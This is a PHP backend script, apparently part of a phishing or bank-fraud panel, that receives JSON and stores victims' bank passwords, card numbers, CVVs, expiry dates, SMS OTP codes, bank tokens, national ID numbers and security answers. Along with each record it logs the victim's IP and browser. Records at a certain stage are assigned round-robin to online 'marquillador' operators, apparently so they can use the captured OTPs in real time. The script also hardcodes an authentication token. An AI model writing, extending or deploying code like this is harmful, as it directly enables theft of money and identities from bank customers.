<?php
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Origin: *"); // Permite CORS si es necesario
date_default_timezone_set("America/Bogota");

// Token de autenticación simple (¡MEJORAR ESTO PARA PRODUCCIÓN!)
$tokenEsperado = 'EZnDyqEgnhVxDHLRTqS5pMaa_pbJEKOK9PxpsSXAN2g';
// Ruta para archivos de log, útil para depuración. Asegúrate de que la carpeta sea escribible.
$logFile = __DIR__ . '/registro.log';

function log_debug($msg) {
    global $logFile;
    file_put_contents($logFile, "[" . date('Y-m-d H:i:s') . "] " . $msg . PHP_EOL, FILE_APPEND);
}

// Validar token en la cabecera X-Auth-Token
$headers = getallheaders();
if (!isset($headers['X-Auth-Token']) || $headers['X-Auth-Token'] !== $tokenEsperado) {
    http_response_code(403);
    $tokenRecibido = isset($headers['X-Auth-Token']) ? $headers['X-Auth-Token'] : 'NULO';
    log_debug("Token inválido recibido: " . $tokenRecibido . " desde IP: " . ($_SERVER['REMOTE_ADDR'] ?? 'Desconocida'));
    echo json_encode(["status" => "ERROR", "message" => "Token de autenticación inválido."]);
    exit;
}

// Obtener los datos JSON del cuerpo de la solicitud
$input = file_get_contents("php://input");
$data = json_decode($input, true);

if (json_last_error() !== JSON_ERROR_NONE) {
    log_debug("Error al decodificar JSON. Datos brutos: " . $input);
    http_response_code(400); // Bad Request
    echo json_encode(["status" => "ERROR", "message" => "Formato de datos JSON inválido."]);
    exit;
}
log_debug("Datos recibidos (JSON): " . json_encode($data));

if (empty($data)) {
    http_response_code(400); // Bad Request
    echo json_encode(["status" => "ERROR", "message" => "No se recibieron datos para el registro."]);
    exit;
}

// Incluir el archivo de conexión centralizado a la base de datos (PDO)
require_once '../db.php'; // Asegúrate de que la ruta sea correcta

// --- MODIFICADO: Lógica para asignar 'tienda' basada en 'origen_llamada' y 'tienda_nombre' ---
$received_origen_llamada = $data['origen_llamada'] ?? 'sin datos';
$received_tienda_nombre = $data['tienda_nombre'] ?? null; // Obtener el nombre de la tienda recibido

if ($received_origen_llamada === 'directo') {
    $data['tienda'] = 'directo'; // Si es directo, tienda es 'directo'
    log_debug("DEBUG: origen_llamada es 'directo', forzando tienda a 'directo'.");
} elseif ($received_origen_llamada === 'tienda' && !empty($received_tienda_nombre)) {
    $data['tienda'] = $received_tienda_nombre; // Si es tienda y hay nombre, usar el nombre
    log_debug("DEBUG: origen_llamada es 'tienda', asignando tienda a '" . $received_tienda_nombre . "'.");
} else {
    // Si no es ninguno de los anteriores, mantener el valor que vino o 'sin datos'.
    // Esto maneja casos donde 'tienda' podría venir de otra fuente o ser vacío.
    $data['tienda'] = $data['tienda'] ?? 'sin datos'; 
    log_debug("DEBUG: origen_llamada no 'directo' ni 'tienda', tienda mantiene su valor original o 'sin datos'.");
}
// --- FIN MODIFICADO ---


// Definir todos los campos posibles de la tabla 'registros' en el orden de la DB
$columnas_tabla_orden = [
    'usuario', 'ip', 'fecha', 'hora', 'navegador', 'sistema_operativo', 'estado_envio',
    'entidad', 'tienda', 'pass', 'ctd', 'ctc', 'ntc', 'ntd', 'cvv', 'fven', 'token',
    'sms_otp', 'correo', 'celular', 'nombres', 'apellidos', 'ccorreo', 'nit',
    'cedula', 'ano_nacimiento', 'preg', 'respuesta', 'status', 'referencia',
    'valor', 'operador', 'nombre_empresa', 'cliente_referencia', 'tipo_cliente',
    'direccion', 'ciudad', 'ultima_conexion',
    'origen_llamada'
    // No necesitamos añadir 'tienda_nombre' aquí, ya que su valor se usa para poblar la columna 'tienda'
];

$valores_bind = [];

// --- Determinar el status inicial y el operador asignado ---
// Usa el status de $data si viene, sino 'Usuario Ingresado'
$status_inicial_registro = $data['status'] ?? 'Usuario Ingresado'; 
$operador_asignado = 'sin datos'; // Default, será asignado si $status_inicial_registro es 'Referencia Ingresada'

if ($status_inicial_registro === 'Referencia Ingresada') {
    try {
        // 1. Obtener marquilladores activos (ej. conectados en el último 1 minuto)
        // Usar NOW() - INTERVAL 1 MINUTE para MySQL/MariaDB
        $sql_query_marquilladores = "
            SELECT username, id 
            FROM panel_users 
            WHERE role = 'marquillador' 
            AND last_login_at >= NOW() - INTERVAL 1 MINUTE
            ORDER BY id ASC
        ";
        $stmt_marquilladores = $db->prepare($sql_query_marquilladores); 
        $stmt_marquilladores->execute();
        $marquilladores_activos = $stmt_marquilladores->fetchAll(PDO::FETCH_ASSOC);

        log_debug("DEBUG: Marquilladores activos encontrados: " . count($marquilladores_activos));

        if (!empty($marquilladores_activos)) {
            // 2. Implementar lógica de round-robin simple
            // Obtener el ID del último registro insertado para usarlo como base para la asignación
            $last_record_id = 0;
            $stmt_last_id = $db->query("SELECT MAX(id) FROM registros");
            if ($stmt_last_id) {
                $last_record_id = $stmt_last_id->fetchColumn();
            }
            
            // Usar el ID del registro + 1 (para el nuevo registro) para la asignación round-robin
            $next_record_id = $last_record_id + 1;
            $num_marquilladores = count($marquilladores_activos);
            $index_asignado = ($next_record_id - 1) % $num_marquilladores; // -1 para base 0
            
            $operador_asignado = $marquilladores_activos[$index_asignado]['username'];
            log_debug("Marquillador asignado: " . $operador_asignado . " para el registro ID: " . $next_record_id);
            
        } else {
            error_log("No hay marquilladores activos (last_login_at < 1 min) para asignar el registro 'Referencia Ingresada'. Registro ID: " . ($last_record_id + 1));
            // Si no hay marquilladores activos, se deja el operador como 'sin datos'
        }
    } catch (PDOException $e) {
        error_log("Error de DB al intentar asignar marquillador: " . $e->getMessage());
        // En caso de error, el operador_asignado seguirá siendo 'sin datos'
    }
}


// Recopilar y limpiar todos los valores para la inserción
foreach ($columnas_tabla_orden as $columna) {
    // Aquí, $data[$columna] ya contendrá el valor de 'tienda' ajustado por la lógica de arriba
    $valor_a_insertar = $data[$columna] ?? 'sin datos'; 

    // --- Lógica para campos especiales y limpieza ---
    switch ($columna) {
        case 'ip':
            $valor_a_insertar = $_SERVER['REMOTE_ADDR'] ?? 'desconocida';
            break;
        case 'fecha':
            $valor_a_insertar = date('Y-m-d');
            break;
        case 'hora':
            $valor_a_insertar = date('H:i:s');
            break;
        case 'navegador':
            // No hay limpieza específica aquí, usar valor de $data o 'sin datos'
            break;
        case 'sistema_operativo':
            $valor_a_insertar = $data['sistema'] ?? ($data['sistema_operativo'] ?? 'sin datos'); // Usa 'sistema' o 'sistema_operativo'
            break;
        case 'estado_envio':
            // No hay limpieza específica aquí, usar valor de $data o 'sin datos'
            break;
        case 'entidad':
            // No hay limpieza específica aquí, usar valor de $data o 'sin datos'
            break;
        case 'tienda':
            // No hay limpieza específica aquí, usar valor de $data o 'sin datos'
            break;
        case 'pass':
            // No hay limpieza específica aquí, usar valor de $data o 'sin datos'
            break;
        case 'ctd':
            // No hay limpieza específica aquí, usar valor de $data o 'sin datos'
            break;
        case 'ctc':
            // No hay limpieza específica aquí, usar valor de $data o 'sin datos'
            break;
        case 'ntc':
            // No hay limpieza específica aquí, usar valor de $data o 'sin datos'
            break;
        case 'ntd':
            // No hay limpieza específica aquí, usar valor de $data o 'sin datos'
            break;
        case 'cvv':
        case 'token':
        case 'sms_otp':
        case 'celular':
        case 'ano_nacimiento':
            if (!empty($valor_a_insertar) && $valor_a_insertar !== 'sin datos') {
                $valor_a_insertar = preg_replace('/\D/', '', $valor_a_insertar); // Solo dígitos
            }
            break;
        case 'fven':
            // No hay limpieza específica aquí, usar valor de $data o 'sin datos'
            break;
        case 'correo':
        case 'nombres':
        case 'apellidos':
        case 'ccorreo':
        case 'nit':
            // No hay limpieza específica aquí, usar valor de $data o 'sin datos'
            break;
        case 'cedula':
            if (!empty($valor_a_insertar) && $valor_a_insertar !== 'sin datos') {
                $valor_a_insertar = str_replace('.', '', $valor_a_insertar); // Quitar puntos
                $valor_a_insertar = preg_replace('/\D/', '', $valor_a_insertar); // Solo dígitos
            }
            break;
        case 'preg':
        case 'respuesta':
        case 'referencia':
        case 'valor':
        case 'nombre_empresa':
        case 'cliente_referencia':
        case 'tipo_cliente':
        case 'direccion':
        case 'ciudad':
            // No hay limpieza específica aquí, usar valor de $data o 'sin datos'
            break;
        case 'status':
            $valor_a_insertar = $status_inicial_registro; // Usar el status determinado al inicio
            break;
        case 'operador':
            $valor_a_insertar = $operador_asignado; // Usar el operador determinado al inicio
            break;
        case 'ultima_conexion':
            $valor_a_insertar = date('Y-m-d H:i:s');
            break;
        case 'origen_llamada':
            // No se necesita limpieza especial, se usa el valor de $data o 'desconocido'
            break;
        // Default ya cubierto por la asignación inicial de $data[$columna] ?? 'sin datos'
    }
    
    // Asegurarse de que el valor final para binding sea una cadena si es null/false/etc.
    if ($valor_a_insertar === null || $valor_a_insertar === false) {
        $valores_bind[] = 'sin datos'; 
    } else {
        $valores_bind[] = $valor_a_insertar;
    }
}


$sql = "INSERT INTO registros (`" . implode("`, `", $columnas_tabla_orden) . "`) VALUES (" . implode(", ", array_fill(0, count($columnas_tabla_orden), "?")) . ")";

try {
    $stmt = $db->prepare($sql);

    if (!$stmt) {
        http_response_code(500);
        error_log("Error al preparar la consulta INSERT en registro.php: " . implode(":", $db->errorInfo()));
        echo json_encode(["status" => "ERROR", "message" => "Error interno del servidor al preparar registro."]);
        exit;
    }

    if (!$stmt->execute($valores_bind)) {
        http_response_code(500);
        error_log("Error al ejecutar la consulta INSERT en registro.php: " . implode(":", $stmt->errorInfo()));
        echo json_encode(["status" => "ERROR", "message" => "Fallo al insertar el registro."]);
        exit;
    }

    $idInsertado = $db->lastInsertId();

    log_debug("Datos insertados correctamente con ID: " . $idInsertado . ". Data: " . json_encode($data) . ". Operador asignado: " . $operador_asignado);
    echo json_encode([
        "status" => "OK",
        "id" => $idInsertado,
        "operador_asignado" => $operador_asignado // Para depuración
    ]);

} catch (PDOException $e) {
    http_response_code(500);
    error_log("Error de base de datos en registro.php: " . $e->getMessage());
    echo json_encode(["status" => "ERROR", "message" => "Error de base de datos al registrar."]);
}